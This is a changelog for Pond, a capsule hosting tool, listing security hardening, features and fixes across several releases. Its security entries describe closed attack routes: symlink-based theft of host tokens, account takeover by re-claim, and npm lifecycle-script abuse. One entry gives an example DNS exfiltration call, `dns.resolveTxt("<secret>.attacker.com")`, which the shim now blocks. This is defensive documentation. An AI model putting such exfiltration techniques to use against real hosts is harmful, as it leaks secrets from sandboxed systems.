# Changelog

Format: [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
Versioning: [Semver](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.5.3] - 2026-08-09

### Security (host)

- **Symlink-safe host file operations.** Capsules have read/write access to their own deploy dir, so the host now treats it as attacker-controlled: every host-side read verifies the realpath stays inside the deploy dir, and every write goes through temp-file + rename (which replaces a planted symlink instead of following it). Previously a capsule could plant a symlink and exfiltrate `host-token` or a sibling's `.env.pond.server`, or redirect a host write onto `deploy-worker.js` (RCE as the host user). Bundler entries and imports are also confined to the capsule root (a `../../host-token` import can no longer be bundled into the deploy).
- **Deploy records are corruption-tolerant.** `deploy.json` lives in the tenant-writable dir; a corrupted/truncated file previously crashed the whole control plane through the websocket-upgrade, crash-respawn and boot paths. Reads now return null and degrade to 404s.
- **Per-deploy session secrets.** The auto-injected `POND_SESSION_SECRET` is now generated per deploy (reused across updates), not host-wide — a shared secret in the tenant-readable env file would have let any tenant forge sessions for every other capsule.
- **Serialized per-deploy boots.** Concurrent redeploys (IDE autobuild + env update, two tabs) previously forked two workers and orphaned the first — invisible to the idle reaper and disk watchdog. Boots are now chained per deploy, and deletes/terminates wait for in-flight boots.
- **Quota checks before writes.** Redeploys build into a staging dir and env updates check projected size BEFORE persisting, so a 413 can no longer leave an oversized bundle/env on disk.
- **Flag validation fails closed.** `--capsule-fs-isolation=bwarp` (typo) previously booted capsules unconfined; non-numeric `--anonymous-rate-per-hour` silently disabled rate limiting. Both now refuse to start / heal to the default.
- **Proxy + websocket hardening.** Per-deploy in-flight proxy cap, 15s connect timeout on websocket upgrades (with a catch-all so a failure can't take down the process), and the (staged) egress proxy no longer forwards the per-deploy credential upstream and only allows web ports.
- **Strict CSP on host pages.** IDE/dashboard run a nonce-based `script-src` (no `unsafe-inline`, no third-party scripts); docs pages ship `script-src 'none'`. Tailwind is compiled to a static stylesheet at build time — the `cdn.tailwindcss.com` script (a third-party script with full page privileges and no integrity) is gone. Frontend bundles are served as versioned hashed assets with immutable caching instead of re-sending ~600 KB inline per page load.

### Added

- `pond --version` works (was an error before).
- IDE log panel now streams via the control plane's owner-authed logs endpoint (the old cross-origin SSE stream was CORS-blocked in production) with auto-reconnect + a reconnecting indicator.
- Dashboard returns to sign-in on any 401/403 (token rotated elsewhere no longer leaves a half-broken UI); clipboard failures are reported instead of claiming success.
- CI: generated-artifact freshness check, dependabot, a release workflow (`npm publish --provenance` from a `v*` tag), workflow action bumps, concurrency group + job timeouts.
- `.editorconfig`; `bin/pondsh.js` / `bin/pond-mcp.js` are executable.

### Fixed

- **`new --generate` validates the prompt before scaffolding** — a missing prompt no longer strands a half-created project dir.
- **Dev-server rebuilds are serialized and watch the whole project** — `shared/*` edits now hot-reload (previously only `server/index.ts`, `client/index.tsx` and the env file were watched), and a failed rebuild can no longer pair the new client HTML with the old runtime or leak a SQLite handle per rebuild.
- **Scaffolded session secret is actually loaded** — the template's `POND_SESSION_SECRET` line was commented out (`#`), so the generated secret never took effect and dev sessions died on every restart.
- **MCP server speaks valid JSON-RPC** — notifications are never answered, missing params return `-32602` (not `-32603`), `env_set`/`write_file` match the host API (they were sending the wrong shapes and writing JSON-encoded content to files), paths are URL-encoded, and control-plane calls have a 30s timeout.
- **Client library** — mutations can no longer report failure after a server-side success (refetch pass is settled), server error bodies are included in thrown errors, requests have timeouts + abort-on-unmount, and the whole surface is documented.
- **Runtime** — `insert({})`/`update(id, {})` produce valid SQL, rate-limit buckets are swept (unbounded memory leak), `retry-after` matches the limit window, forwarded headers are only trusted with `TRUST_PROXY=1`, endpoint methods are validated, blob-prefix `LIKE` wildcards are escaped, and AI/Shopify/Resend/OAuth calls have 30s timeouts.
- **CLI** — expected failures print one-line errors instead of raw stack dumps (shared `fail()`/`httpError()` helpers), bare `pond auth|token|user|admin` print help and exit 0, ports are validated loudly, `detectClaude` no longer spawns a directory, `db restore`/`db migrate` check status before parsing JSON, log streams flush the final event, and browser launch failures are detected.
- **Orphaned artifacts removed** — the compiled `edit`/`agent-run` leftovers (a deleted feature) no longer ship in the npm package.
- **Tests** — three always-pass assertions now assert something real, and the duplicated host fixtures live in `test/helpers.mjs`.

### Changed

- `engines` is now `node >=20.19` (the code uses `import.meta.dirname`; Node 18 never worked), README badge + CONTRIBUTING updated, and the README sandbox/threat-model sections now describe what the code actually does (dns/dgram sealed, bwrap + cgroup + nft layers, symlink-safe host ops, per-deploy secrets).
- Unused dependencies removed (`preact-render-to-string`, `codemirror`, direct `@codemirror/language`); `tailwindcss` added as a devDependency for the compiled stylesheet.

## [0.5.2] - 2026-06-07

### Security

- **Removed `controlUrl` from IDE bootstrap.** The dashboard lost this field in 0.5.0; the IDE still injected the internal control plane URL (`http://0.0.0.0:8787`) into `window.__POND_IDE`. The IDE never read it — `readBootstrap()` ignored it — but any script in the page could. Bootstrap now matches the dashboard: `deployId`, `deployUrl`, `publicHost`, and optional `lastBuild` only.

### Fixed

- **`pond dev` detects IPv6-only port occupants.** On dual-stack hosts where something binds `[::1]:3000` but not `127.0.0.1:3000`, the dev server's port probe previously reported the port free and then crashed with `EADDRINUSE`. The probe now checks both families.

- **Landing demo video served via jsDelivr CDN.** The hero video and poster no longer depend on bundling large media into the host binary; they load from the public `pond-assets` repo.

### Added

- **Gitleaks secret-scan in CI** (`/.github/workflows/secret-scan.yml`) and a **no-deps pre-commit hook** (`scripts/secret-scan.sh`, a pattern scanner over staged files). Catches accidental credential commits before they land on `main`; gitleaks runs in CI on full history.

## [0.5.1] - 2026-05-31

### Added

- **Static deploys** — capsules can ship as prebuilt `client.html` with no resident worker, shrinking per-deploy memory cost on the host.
- **Public `/stats` page** with 24h / 7d / all-time deploy counts, dot-matrix chart, and a custom landing video player.
- **Landing SEO + "Watch the demo" scroll CTA.**

### Fixed

- **Wake path capacity gate** — on-demand capsule wakes now respect `POND_MAX_ACTIVE_CAPSULES` so a burst of simultaneous wakes can't overshoot the ceiling.
- **Dashboard owner mapping** — `/api/users/me` `userId` is now exposed as `me.id` so the dashboard can filter owned deploys.
- **Dashboard live previews** — deploy pages can be framed in the dashboard iframe again.

### Changed

- **`/stats` palette** neutralized to match the landing page black; video controls polished.

## [0.5.0] - 2026-05-31

### Added

- **`pond edit "<change>"` — iterate on a capsule with a local agent.** The counterpart to `pond new --generate`: run it inside an existing capsule with a plain-English change request and the same agent cascade (hermes → claude → codex) reads the current `server/index.ts`, `client/index.tsx`, `shared/`, and the `.claude/CLAUDE.md` contract, then makes the change in place (preserving working features). Headless rules match `--generate` — no dev server, no curl/verify loops. An agent that exits without touching any source file is treated as a failure and the next agent is tried. `--agent <hermes|claude|codex>` forces a specific agent.
  - `src/agent-run.ts` (new) — `runAgentTask()`, the detect-cascade + live-progress panel + proof-of-work change detection, extracted from `pond new --generate` so both commands share one implementation.
  - `src/commands/edit.ts` (new) — the command: capsule-root check (`server/index.ts`), prompt construction, agent forcing, next-steps output.
  - `src/commands/new.ts` — `--generate` now calls `runAgentTask()` instead of its own inline loop (no behavior change; the old per-file spinner is now a generic changed-files panel).
  - `src/cli.ts` — register `edit` next to `new`.
  - `test/cli.test.mjs` — 3 guard-path tests (not-a-capsule, missing description, unknown `--agent`).
  - Docs: `README.md` CLI table + "Keep building: `pond edit`" section; `docs/cli-reference.md` at-a-glance row + `## pond edit` section.

- **Shopify-connected capsules — `ctx.shopify.graphql()`.** A new first-class context helper that lets a capsule call the Shopify Admin GraphQL API using a Custom App access token. Reads `SHOPIFY_SHOP`, `SHOPIFY_TOKEN`, and `SHOPIFY_API_VERSION` from capsule env (`.env.pond.server` or `pond env set`). Normalizes bare shop names and protocol-prefixed URLs. Throws clear errors on missing env, non-2xx responses, and GraphQL `errors` arrays. Export `createShopify()` from `src/runtime.ts` for testing.
  - `src/server/index.ts` — new `CapsuleShopify` interface, `shopify` field on `CapsuleContext`.
  - `src/runtime.ts` — `createShopify()` implementation wired into `buildContext()`.
  - `test/shopify.test.mjs` — 9 unit tests covering missing env, URL/header/body construction, shop name normalization, HTTP errors, GraphQL errors, and API version override.
  - Docs: `docs/api-reference.md` — context interface updated, full `ctx.shopify` section with env var table, example, error handling, and authenticated-deploy requirement.
  - Agent guidance: `src/template.ts` capsule contract mentions `ctx.shopify`.

- **`pond new --template shopify` scaffold.** A new template selectable via `pond new <name> --template shopify`. Scaffolds a capsule with a `products` query (calls `ctx.shopify.graphql()`), a Preact product-table UI, and placeholder env vars in `.env.pond.server`. Includes a comment block in `server/index.ts` explaining how to create a Shopify Custom App and set env vars.
  - `src/templates.ts` — new `SHOPIFY` template constant added to `TEMPLATES` array.
  - Template respects the existing Pond house style (bg-black, neutral palette, square corners, wireframe buttons, tabular-nums).

- **Scale-to-zero for hosted capsules (`--capsule-idle-timeout` / `POND_CAPSULE_IDLE_TIMEOUT`).** Until now every deploy stayed resident for the host's lifetime — the host eager-booted all deploys on startup and never stopped an idle one — so memory (and on a usage-billed PaaS, cost) scaled with the _total number_ of deploys rather than with active traffic. The host now sleeps a capsule whose worker has seen no request for the configured idle window and re-boots it on the next request via the existing on-demand `ensureBooted` path, so idle deploys hold no memory and `POND_MAX_ACTIVE_CAPSULES` becomes a ceiling on concurrently-_awake_ capsules instead of on total deploys. Default `0` preserves the historical always-resident behavior, so existing operators are unaffected.
  - `src/commands/host.ts` — the new flag; per-deploy last-activity stamping on every proxied HTTP request and WebSocket connection; a live-socket counter so the reaper never sleeps a capsule mid-stream; idle eviction folded into the existing 60s sweep (`stopDeploy` removes the child from `runningChildren` before its exit handler runs, so a clean sleep is not mistaken for a crash and is not respawned); WebSocket upgrades now also wake a slept capsule (parity with the HTTP path); and, when enabled, lazy startup — deploys boot on first request instead of all at once, so a restart no longer pays for every idle worker.
  - `src/host/idle.ts` (new) — the eviction decision (`selectIdleDeploys`) is a pure, dependency-free function so it unit-tests without booting a host or waiting on the sweep.
  - `deploy/.env.example` documents the knob, the cost rationale, and the trade-offs (a sub-second cold start on wake; a burst of simultaneous wakes can briefly exceed `POND_MAX_ACTIVE_CAPSULES`, so the per-capsule memory cap and a platform spend limit remain the backstops).
  - Tests: `test/host-idle-eviction.test.mjs` covers the disabled, at-threshold, recently-active, live-socket, mid-boot, and missing-stamp cases.

### Security

- **Security headers on all responses.** Added `strict-transport-security`, `x-content-type-options`, `x-frame-options`, `referrer-policy`, and `permissions-policy` headers via the existing middleware. CSP intentionally omitted because the dashboard loads Tailwind from CDN + inline scripts.
- **Removed `controlUrl` from dashboard bootstrap.** The internal control plane URL (`http://0.0.0.0:8787`) is no longer injected into the dashboard HTML. The dashboard now derives its API endpoint from `window.location` instead.
- **Generalized abuse page quotas.** Replaced exact service limits on the `/abuse` page with a summary of the quota model without disclosing specific numbers.
- **Opaque capacity error message.** Changed the 503 "Host at capacity" error to a generic "Service unavailable" to avoid leaking internal state.
- **P0–P2 host/runtime hardening** from the security gap audit (rate limits, sandbox boundaries, token handling).

### Changed

- **Capacity 503 error message.** The admission-control 503 response now returns `"Service unavailable"` instead of `"Host at capacity — try again shortly"` to avoid exposing real-time capacity state.

- **Authenticated-deploy requirement documented for Shopify capsules.** Anonymous deploys block outbound `fetch` by design. The docs and template both note that Shopify capsules must be claimed before `ctx.shopify.graphql()` can reach the Shopify Admin API. The anonymous sandbox is not weakened.

## [0.4.3] - 2026-05-28

### Fixed

- **`pond new --generate` live spinner no longer leaves a trail of `… is building…` lines on Windows.** The live progress panel redraws by moving the cursor up by the number of logical lines it printed (`\x1b[${drawnLines}F\x1b[J`, 3 lines). But the activity line can exceed the terminal width — long absolute paths like `C:\Users\torre\…\server\index.ts` — and a too-wide line wraps onto extra physical rows. The cursor-up count then undershoots the rows actually occupied, so the top line is never erased and each tick orphans another copy. `draw()` in `src/commands/new.ts` now clips each line to the terminal width (`process.stdout.columns`), keeping logical lines equal to physical rows so the in-place redraw stays aligned on every platform.

## [0.4.2] - 2026-05-28

### Fixed

- **Schemas can now use SQLite reserved words as table and column names.** A capsule with a column named `key` (or `order`, `index`, `group`, etc.) failed to boot with `Identifier "key" is a SQLite reserved word`, because `assertIdent()` in `src/runtime.ts` rejected reserved words outright and the runtime interpolated raw identifiers into SQL (`SELECT * FROM ${tableName}`). The runtime now double-quotes every table/column identifier in generated SQL — SQLite's standard mechanism for using reserved words — across `CREATE TABLE`, `ALTER TABLE`, `PRAGMA table_info`, and the query builder's `SELECT`/`WHERE`/`ORDER BY`/`INSERT`/`UPDATE`/`DELETE`. A new `quoteIdent()` helper validates identifier shape (the existing `^[A-Za-z_][A-Za-z0-9_]*$` restriction is unchanged, so there is nothing to escape and no injection risk) and the reserved-word rejection — plus the now-unused `SQLITE_RESERVED_WORDS` list — is removed. The `_pond_` prefix and length guards remain. Existing capsules are unaffected; those that previously couldn't boot now work without renaming columns. A test in `test/host.test.mjs` deploys a capsule with a reserved-word table (`select`) and column (`order`) and confirms it boots and serves queries. 194/194 tests pass.

## [0.3.34] - 2026-05-28

### Added

- **DNS-exfil hardening in the anonymous-worker network shim.** A restricted worker with `net.Socket.connect` blocked could still leak data through the resolver — `dns.resolveTxt("<secret>.attacker.com")` emits a query that leaves the box before any TCP connect. `installNetworkRestriction()` in `src/host/deploy-worker.ts` now blocks the full `node:dns` resolver surface — `lookup`, `lookupService`, `resolve`/`resolve4`/`resolve6`/`resolveAny`/`resolveCname`/`resolveCaa`/`resolveMx`/`resolveNaptr`/`resolveNs`/`resolvePtr`/`resolveSoa`/`resolveSrv`/`resolveTxt`, and `reverse` — across the callback API, `dns.promises`, **and** `dns.Resolver` / `dns.promises.Resolver` instances (whose methods bypass the module-level patches). Literal IPs and `localhost` still resolve so the worker can bind its own server. This is defense-in-depth at the JS layer; the OS nft rule dropping port 53 remains the real boundary. Tests in `test/deploy-worker-egress.test.mjs` cover `dns.lookup`, `dns.promises.resolve`, `dns.resolveTxt`, a `Resolver` instance, and the existing `net.Socket.connect` shim, run in isolated child processes.
- **Anonymous-deploy trust boundary made explicit and enforceable.** Two product-level mitigations turn "deploy anonymously" from aspirational isolation into something an operator can actually police:
  - **Cloudflare Turnstile on anonymous `POST /api/deploys`.** New `--turnstile-secret` flag on `pond host` (also `POND_TURNSTILE_SECRET`). When set, anonymous deploys must carry a verified Turnstile token (an `x-pond-turnstile-token` header or a `turnstileToken` body field), checked against Cloudflare's siteverify. When unset (default), there is no challenge — dev/CI and existing operators are unaffected. Authenticated deploys are never challenged. Verification is factored into `src/host/turnstile.ts` so it unit-tests with a stubbed fetch.
  - **`pond admin terminate <deployId>` operator kill switch.** New `pond admin` command group backed by the existing host token. It calls a new host-token-gated `POST /api/admin/deploys/:id/terminate` endpoint that reuses the sweep's terminate path (stop the worker; mark anonymous deploys terminated). Auth via `POND_HOST_TOKEN` / `--host-token`.
  - Docs: `docs/abuse-policy.md` and `docs/operations.md` now spell out the trust boundary (challenge → rate limit → sandbox → TTL → manual terminate); `docs/cli-reference.md` documents the new flag, env vars, and command. The "What's next" list marks both items done.
- **Capsule Spec v1 (`docs/capsule-spec.md`).** An authoritative, versioned definition of the capsule format and wire protocol — the directory/import contract, the `pond/server` + `pond/client` API surface, every HTTP route a capsule exposes (request/response/error shapes), a conformance checklist, and a minimal worked example. Lets a coding agent (or a third-party runtime) target the capsule format without the private runtime source. Linked from `docs/llms.txt`.

## [0.3.16] - 2026-05-27

### Added

- **Parameterized queries — `query()` and `useQuery()` now accept arguments.** Previously, `QueryHandler` was `(ctx) => T` and `useQuery<T>(name)` took no args, so the only way to do a parameterized read from the client was to misuse a `mutation` (semantically a write, sends POST) or drop down to a custom `endpoint()` + raw `fetch` from the client — which directly contradicts the docs' "No `fetch` from the client to your own server — use `useQuery` / `useMutation`" rule. There was no in-model way to express "get post by id" or "search items by keyword." That's fixed:
  - `src/server/index.ts` — `QueryHandler<TArgs, TResult>` and `query<TArgs, TResult>(handler)` now mirror `mutation()` exactly. Default `TArgs = any[]` so existing 0-arg capsules compile unchanged.
  - `src/runtime.ts` — `GET /api/query/:name` stays mounted for the 0-arg case (cacheable, visible as a plain GET in the network panel). A new `POST /api/query/:name` reads `{ args: any[] }` from the JSON body and spreads them into the handler. Both routes share the same `query:<name>` metric span and the same rate-limit key. Missing / non-array `args` is treated as zero args (no crash).
  - `client/index.ts` — `useQuery<T, TArgs>(name, ...args)`. No args → GET (existing behavior). Args present → POST with `{ args }`. Args are part of the cache key (`JSON.stringify(args)`) and the `useEffect` deps array, so changing them triggers a refetch automatically. Mutation-triggered `refetchAllQueries()` still works — each subscriber holds its own args closure and refetches with its own args.
  - Docs: `docs/api-reference.md` and `docs/client-reference.md` document the new signatures with `postById` and `search` examples; `docs/llms-full.txt` regenerates from these during `npm run build`. `src/template.ts` agent-template guidance now teaches the parameterized form alongside the existing examples.
  - One new regression test in `test/runtime-features.test.mjs` (`parameterized query: POST /api/query/:name spreads args; GET still works for 0-arg`) covers GET-0-arg, POST-with-1-arg, POST-with-multi-arg (positional spread), and the empty-body fallback. 132/132 tests pass.

  **Wire change is additive and backward-compatible.** Existing capsules that only define 0-arg queries keep working unchanged — the GET route still resolves them the same way. New parameterized queries hit the new POST route. Mental model stays the same as before: `query` = read, `mutation` = write, `endpoint` = external HTTP / webhooks.

  Usage:

  ```ts
  // server/index.ts
  queries: {
    postById: query((ctx, id: string) => ctx.db.posts.get(id)),
    search: query((ctx, q: string, limit: number) =>
      ctx.db.posts.where("title", q).limit(limit).all()
    ),
  }
  ```

  ```tsx
  // client/index.tsx
  const { data: post } = useQuery<Post, [string]>("postById", id)
  const { data: hits } = useQuery<Post[], [string, number]>("search", keyword, 20)
  ```

## [0.3.15] - 2026-05-27

### Fixed

- **`pond-mcp`'s `tail_logs` tool now works against remote deploys.** Two compounding bugs left it returning errors for every remote deploy. (1) The handler cast `/api/deploys` to `Array<...>`, but the endpoint returns `{ deploys: [...] }` — so `deploys.find` threw `is not a function` before any network call was made. (2) Even with that fixed, the handler talked directly to `<deploy>/__pond/logs` with `Authorization: Bearer <accountToken>`, but the deploy gates `/__pond/*` on `x-pond-claim-token` only, and the control plane has stored just the sha256 of the claim token since 0.3.10 — so MCP could not produce a valid claim-token header and got `403` against every remote deploy.

  Fix: add a bearer-authed control-plane proxy `GET /api/deploys/:deployId/logs?limit=N` that owner-checks the caller and reads the deploy's recent log entries from `<deployDir>/.pond/logs.ndjson` directly (worker cwd is the deploy dir, so that file is the same on-disk replay buffer the SSE endpoint serves from on initial connect). Simplifies the MCP `tail_logs` handler to a single call against the new endpoint — no more SSE accumulation loop, no more cross-component auth-scheme mismatch. Caps `limit` at 500. Five regression tests in `host.test.mjs` cover the happy path, missing-bearer 401, non-owner 403, anonymous-deploy 403, and the limit cap.

## [0.3.14] - 2026-05-27

### Fixed

- **`pond login` now reuses the saved credential when no `--token` is provided** instead of dumping the "Need a token to attach. Three paths forward" error wall — which fired even when `~/.pond/credentials.json` already had a perfectly valid token for the target apiUrl. After `pond signup` saves credentials (or the user already authenticated on another flow), `pond login`, `pond login --username your-username`, and `pond login --api https://pond.run` all just surface `Already logged in as your-username (admin) at https://pond.run  (credential from ~/.pond/credentials.json)` and exit 0, after validating the token against `GET /api/users/me`. The validate-and-show flow handles three distinct response classes:
  - **Server returns 2xx** → "Already logged in as …" with the live username/admin status.
  - **Server returns 401/403/404** → token has been rotated or revoked; refuse to silently use it, exit 1 with a precise message naming the saved username and the rotation path.
  - **Network failure / transient 5xx** → trust the saved credential, exit 0, but print `Saved credential for … at … (could not validate — network error (…))` so the user sees why no live confirmation happened. Without this fallback, offline use of `pond login` would be a regression vs the pre-0.3.13 error-wall behavior.

  If `--username` is passed and doesn't match the saved one (the common typo case — e.g. `Your-Username` vs the actual `your-username`), the error spells out the case-sensitivity rule and shows both the "use the saved one" and "attach as the new name with --token" paths. No more guessing what to paste.

### Security

- **Red team verified.** Reviewed the new credential-reuse flow against 15 vectors (co-tenant on shared OS, error-message info leak, malicious local process triggering validate calls as a rotation oracle, DNS/MITM, plain-HTTP `--api`, hostile control-plane response injection, malformed `credentials.json`, case-confused `--api`, `--username` mismatch causing validation against the wrong user, silent overwrite on validation failure, cross-apiUrl confusion, concurrent-run race, offline fallback, network MITM, 0.3.7-era bind-address echo). No new attack surface — every concern either pre-dates the change, requires capabilities (file read on 0o600 `credentials.json`, network MITM) the attacker would use to bypass `pond login` entirely, or is handled correctly by the code (silent on parse failure, no save on validation failure, no cross-apiUrl mixing, 401 vs network-error distinction). Regression tests (3 new in `host.test.mjs`) cover the happy path, the offline fallback, and the server-401 refusal.

## [0.3.12] - 2026-05-27

### Docs

- **Doc-only release.** Reships the 0.3.11 doc updates that landed after the 0.3.11 tarball was published. `docs/cli-reference.md` was updated to document the new target-resolution rules in `pond inspect` / `pond logs` / `pond db` (`--local` flag, auto-target from `.pond/deploy.json`, fallback to localhost), the re-claim authorization rule introduced in 0.3.9 (already-claimed deploys reject cross-owner reattachment), the bare-invocation help on `pond db` / `pond env` / `pond domains`, and the upload-side rejection added to `pond fork`'s `--allow-scripts` description. `docs/llms-full.txt` regenerated (~42.4 KB). Ships these to npm and to `pond host`'s `/docs/<slug>.md` agent route. No code changes vs 0.3.11.

## [0.3.11] - 2026-05-27

### Security

- **Source uploads with `package.json` lifecycle scripts are rejected (supply-chain hardening).** Pond builds capsules via esbuild and never runs `npm install` on the host, so `preinstall` / `install` / `postinstall` / `prepare` / `postprepare` scripts in a capsule's `package.json` have no legitimate purpose on a hosted deploy. They DO have a malicious purpose: any forker who later runs `npm install` (which `pond fork` instructs them to do as the next step) silently executes those scripts. Pre-0.3.11 the host accepted them on every upload path. Now `validateSourceFiles` (POST /api/deploys, PUT /api/deploys/:id) and the single-file PUT `/files/package.json` both reject with `400 "package.json defines npm lifecycle script(s) <list> which are not allowed on hosted deploys"`. The download-side `pond fork` check (which has had `--allow-scripts` since 0.3.x) stays in place and now shares the validator via `src/host/package-json-validation.ts`. Regression tests cover both upload paths.
- **`extractCapsuleMeta` no longer flips a deploy public from a `public: true` token inside a comment or string literal.** `host.ts:extractCapsuleMeta` regex-scanned raw source for `\bpublic\s*:\s*true\b`, so a docstring or commented-out example like `// capsule({ public: true })` was enough to mark a private deploy as public — exposing source via `/gallery` and `/api/public-deploys/:id/source`. Source is now run through a small lexer (`stripJsStringsAndComments`) that blanks out single/double/backtick strings and `//` / `/* */` comments before the regex scan. Lengths and newlines are preserved so source positions don't drift if a caller ever inspects them. Regex literals are not handled (rare in capsule code; failing closed on the public flag is the right bias). Title and description still match on raw source — their values live inside strings, and the worst case there is cosmetic gallery display, not a privacy issue. Regression test covers a private deploy whose source mentions `public: true` only in a comment and a string constant — must NOT appear in `/api/public-deploys` and `/api/public-deploys/:id/source` must 404.

### Internal

- **New module `src/host/package-json-validation.ts`.** Exports `LIFECYCLE_SCRIPTS` and `findPackageJsonLifecycleScripts(text)`. Used by host upload paths (POST/PUT bulk + single-file PUT) and by `pond fork` (download side). Single source of truth for the forbidden script names so upload and download checks can't drift.
- **Exported `stripJsStringsAndComments`** (lives in `host.ts`) for use in future server-source scanners that need to ignore lexically-uninteresting text.

### Docs

- **`docs/cli-reference.md` brought up to date for 0.3.7–0.3.11.** Patched `pond inspect`, `pond logs`, and `pond db` to document the new target-resolution rules (`--local`, auto-target from `.pond/deploy.json`, fallback to localhost) introduced in 0.3.10. Patched `pond claim` to spell out the authorization rule introduced in 0.3.9 (already-claimed deploys reject cross-owner reattachment; only the current owner / admin / host token can re-target). Noted that `pond db` / `pond env` / `pond domains` now exit 0 with help when invoked bare. Updated `pond fork --allow-scripts` description to mention the upload-side rejection added in 0.3.11. `docs/llms-full.txt` regenerates from these files during `npm run build` — grew 39.9 KB → 42.4 KB. `docs/api-reference.md` and `docs/operations.md` required no updates (they never described the claim-token-at-rest shape).

## [0.3.10] - 2026-05-27

### Security

- **Claim tokens are no longer stored in plaintext on the control plane.** `HostedDeployRecord` now holds `claimTokenHash` (sha256 hex) instead of `claimToken`. The plaintext is generated at create time, returned to the client ONCE in the `POST /api/deploys` response, and discarded server-side. The worker no longer receives the plaintext either — it gets `inspectSecretHash` and compares `sha256(headerToken) === storedHash` in timing-safe form. A backup leak of `deploys/*/deploy.json` no longer yields usable tokens. Existing pre-0.3.10 records auto-migrate the first time `readRecord` touches them: the plaintext `claimToken` is hashed in place and removed. `writeRecord` also strips any stray `claimToken` field defense-in-depth. The `start-server.ts:canInspect` check used a non-timing-safe `===` against plaintext — replaced with `timingSafeEqual` over sha256 buffers. Regression test in `test/host.test.mjs` asserts that the on-disk record holds only the hash and matches `sha256(plaintext)`.

### Added

- **`pond logs` / `pond inspect` / `pond db` auto-target the hosted deploy in `.pond/deploy.json` when no target is given.** Previously these defaulted to `http://localhost:3000` even when the cwd held a deployed project, so running `pond logs` from a deployed directory either silently hit an unrelated process listening on :3000 or hung waiting for output from the wrong server. Now the resolution order is: `--local` flag (force localhost) → explicit `target` arg → `.pond/deploy.json` with `url`+`claimToken` (auto-remote) → localhost fallback. When auto-remote fires, a one-line `→ Targeting <url>  (pass --local for the dev server)` is printed to stderr so the user always knows which deploy they're talking to. `pond logs` also picked up the friendly ECONNREFUSED handling that `pond inspect` had since 0.3.7.

### Fixed

- **`pond db`, `pond env`, `pond domains` no longer exit 1 with `ERROR No command specified` when invoked bare.** citty throws `E_NO_COMMAND` for subcommand groups without a `run` handler, which prints help AND exits 1. Each parent now has a tiny `run` that detects the bare-invocation case (no positional in `args._`) and renders usage cleanly via citty's `renderUsage`, then exits 0. `pond db list`, `pond env set KEY=val`, etc. continue to dispatch normally because the parent's run becomes a no-op when a subcommand was matched.

### Internal

- **`/api/public-deploys` listing is cached in-memory for 10 seconds.** Without auth, every request previously walked `deploys/`, stat'd each subdirectory, parsed each `deploy.json`, and queried SQLite per id — a trivial request-amplification DOS at scale. The cache is invalidated by every `writeRecord` call (covering create / update / rebuild / claim / rotate / quota changes) and by the DELETE handler, so newly-public deploys appear within at most 10 seconds of going live.
- **PUT `/api/deploys/:id` response no longer echoes the plaintext `claimToken`** (since the server doesn't have it anymore). `pond deploy`'s re-upload path falls back to `localRecord?.claimToken` when the response omits it — the token hasn't rotated, the local copy is still valid. The claim and create flows continue to surface the plaintext to the client as a one-time disclosure.

## [0.3.9] - 2026-05-27

### Security

- **CVE-class: Account takeover via re-claim with a stolen claim token.** `POST /api/deploys/:deployId/claim` allowed any authenticated user to transfer ownership of an already-claimed deploy to themselves by sending `{claimToken: T}` + their own bearer auth. Because the claim token is persisted plaintext on disk (`record.claimToken`), in every cwd's `.pond/deploy.json`, in `~/.pond/credentials.json`, in IDE URL fragments like `pond.run/ide/<id>#token=T`, and pre-0.3.9 in the browser's `localStorage`, a casual leak (screenshare, shoulder-surf, browser-share, backup exfil) was sufficient to dispossess the original owner silently — at which point the attacker had full env/code/db access. The fix in `src/commands/host.ts:1201-1226` rejects cross-owner re-claim with `403 "Deploy already owned by another account"`. The legitimate "I'm reattaching to my own deploy from a new machine" flow is preserved because the bearer in that case belongs to the existing owner. Admins and the host token can still reattach. Denied attempts are audited as `deploy.claim_denied` with `reason: not_current_owner_or_admin`. Regression test in `test/host.test.mjs` (case #9, attacker rejected) and the non-regression sanity (case #10, owner allowed).
- **IDE no longer persists claim tokens in `localStorage` indefinitely.** `src/ide/App.tsx` previously wrote the IDE token (whether bearer or claim) to `window.localStorage` under `pond-ide-token:<deployId>`, where it survived browser restarts forever. Claim tokens — the bearer-equivalent secret that grants edit access to anonymous deploys and (pre-0.3.9 server) could take ownership of a claimed one — now live in `sessionStorage` so they're cleared when the tab closes. Bearer tokens (signed-in users, rotatable via `pond token`) stay in `localStorage` for UX. On load, both stores are checked, so a tab opened with `#token=…` still works for the lifetime of the tab; reopening requires the URL link again. Stale `localStorage` entries from pre-0.3.9 sessions are cleared on first write of a same-keyed token.

### Fixed

- **Claimed-from-anonymous deploys no longer inherit the smaller ANONYMOUS_QUOTA forever.** When a user signed up via `pond signup` to claim their first anonymous deploy, `controlDb.setQuota(deployId, ANONYMOUS_QUOTA)` was set at deploy creation (16 MB bundle / 128 MB disk / 128 MB memory) and never reset, so the deploy stayed at 4× less than the default quota for its lifetime. `host.ts:1202` now also calls `controlDb.setQuota(deployId, DEFAULT_QUOTA)` inside the `if (anon)` claim path. Existing claimed-from-anon records will catch up the next time their quota is touched (or operators can `pond host` admin-reset).

## [0.3.8] - 2026-05-27

### Fixed

- **IDE editor pane now scrolls when files are longer than the viewport.** `CodeMirrorEditor`'s theme set `&: { height: "100%" }` but no `maxHeight`, so on a long source file `.cm-editor` grew past its host container — and the host's `overflow-hidden` clipped the bottom of the editor silently without exposing any scrollbar. Users hitting the bottom of a tall file just saw it stop rendering with no way to scroll. Added `maxHeight: "100%"` to the editor root and explicit `overflow: "auto"` on `.cm-scroller` so overflow happens inside the scroller (which gets the scrollbar) instead of growing the editor past the host.
